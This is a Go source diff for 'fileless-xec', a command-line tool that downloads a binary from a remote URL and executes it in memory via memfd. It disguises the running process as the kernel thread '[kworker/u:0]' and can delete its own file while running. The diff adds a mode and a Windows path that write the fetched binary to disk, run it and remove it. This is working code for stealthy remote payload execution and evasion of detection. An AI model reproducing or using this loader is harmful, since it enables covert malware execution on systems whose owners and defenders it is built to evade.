@@ -9,6 +9,8 @@ import (
 	"log"
 	"net/http"
 	"os"
+	"os/exec"
+	"runtime"
 	"sync"
 	"syscall"
 
@@ -18,7 +20,55 @@ import (
 	"github.com/spf13/cobra"
 )
 
+// Write Binary file on disk
+func WriteBianryFile(filename string, content string) (err error) {
+	f, err := os.Create(filename)
+	if err != nil {
+		return err
+	}
+	defer f.Close()
+	_, err = f.WriteString(content)
+	if err != nil {
+		return err
+	}
+	//Make file executable
+	err = os.Chmod(filename, 0700)
+	if err != nil {
+		return err
+	}
+	return nil
+}
+
+//Exec file retrieve output. TODO: output in real-time + handle input
+func Exec(filename string, argv []string, envv []string) (err error) {
+	defer os.Remove(filename) //with runtime.GOOS != "windows" we could remove earlier
+	cmd := exec.Command("./" + filename)
+	cmd.Args = argv
+	cmd.Env = envv
+	stdout, err := cmd.StdoutPipe()
+	if err != nil {
+		return err
+	}
+
+	if err := cmd.Start(); err != nil {
+		return err
+	}
+
+	data, err := ioutil.ReadAll(stdout)
+
+	if err != nil {
+		return err
+	}
+	if err := cmd.Wait(); err != nil {
+		return err
+	}
+
+	fmt.Println(string(data))
+	return err
+}
+
 //Exec binary file using file descriptor
+//Note: syscall.Exec does not return on success, it causes the current process to be replaced by the one executed
 func Fexecve(fd uintptr, argv []string, envv []string) (err error) {
 	fname := fmt.Sprintf("/proc/%d/fd/%d", os.Getpid(), fd)
 	err = syscall.Exec(fname, argv, envv)
@@ -92,6 +142,7 @@ func main() {
 	var name string
 	var http3 bool
 	var selfRm bool
+	var unstealth bool
 
 	var cmdFilelessxec = &cobra.Command{
 		Use:   "fileless-xec [remote_url]",
@@ -102,6 +153,11 @@ func main() {
 
 			url := args[0]
 
+			// get argument for binary execution
+			argsExec := []string{name}
+			argsExec = append(argsExec, args[1:]...) //argument if binary execution need them fileless-xec <binary_url> -- <flags> <values>
+			environ := os.Environ()
+
 			var binaryRaw string
 			if http3 {
 				binaryRaw = GetBinaryRawHTTP3(url) //https if you used server from example
@@ -109,28 +165,40 @@ func main() {
 				binaryRaw = GetBinaryRaw(url)
 			}
 
-			mfd, err := memfd.Create()
-			if err != nil {
-				panic(err)
-			}
-			defer mfd.Close()
-			_, _ = mfd.WriteString(binaryRaw)
-			err = mfd.SetImmutable()
-			if err != nil {
-				panic(err)
-			}
+			if unstealth || runtime.GOOS == "windows" { //make fileless-xec not stealth
+				binary := "dummy"
+				if runtime.GOOS == "windows" {
+					binary += ".exe"
+				}
+				//write binary file locally
+				err := WriteBianryFile(binary, binaryRaw)
+				if err != nil {
+					fmt.Println(err)
+				}
+				//execute it
+				err = Exec(binary, argsExec, environ)
+				fmt.Println(err)
+			} else {
+				mfd, err := memfd.Create()
+				if err != nil {
+					panic(err)
+				}
+				defer mfd.Close()
+				_, _ = mfd.WriteString(binaryRaw)
+				err = mfd.SetImmutable()
+				if err != nil {
+					panic(err)
+				}
 
-			fd := mfd.Fd()
-			argsExec := []string{name}
-			argsExec = append(argsExec, args[1:]...) //argument if binary execution need them fileless-xec <binary_url> -- <flags> <values>
-			environ := os.Environ()
+				fd := mfd.Fd()
 
-			if selfRm {
-				err = os.Remove("./fileless-xec")
-				log.Fatal(err)
+				if selfRm && runtime.GOOS != "windows" {
+					err = os.Remove("./fileless-xec")
+					log.Fatal(err)
+				}
+
+				Fexecve(fd, argsExec, environ)
 			}
-
-			Fexecve(fd, argsExec, environ)
 
 		},
 	}
@@ -138,7 +206,8 @@ func main() {
 	//flag handling
 	cmdFilelessxec.PersistentFlags().StringVarP(&name, "name", "n", "[kworker/u:0]", "running process name")
 	cmdFilelessxec.PersistentFlags().BoolVarP(&http3, "http3", "Q", false, "use of HTTP3 (QUIC) protocol")
-	cmdFilelessxec.PersistentFlags().BoolVarP(&selfRm, "auto-remove", "r", false, "remove fileless-xec while its execution (only on Linux). fileless-xec must be in the same repository that the excution process")
+	cmdFilelessxec.PersistentFlags().BoolVarP(&selfRm, "self-remove", "r", false, "remove fileless-xec while its execution (only on Linux). fileless-xec must be in the same repository that the excution process")
+	cmdFilelessxec.PersistentFlags().BoolVarP(&unstealth, "unstealth", "u", false, "store the file locally on disk before executing it")
 
 	cmdFilelessxec.Execute()
 }
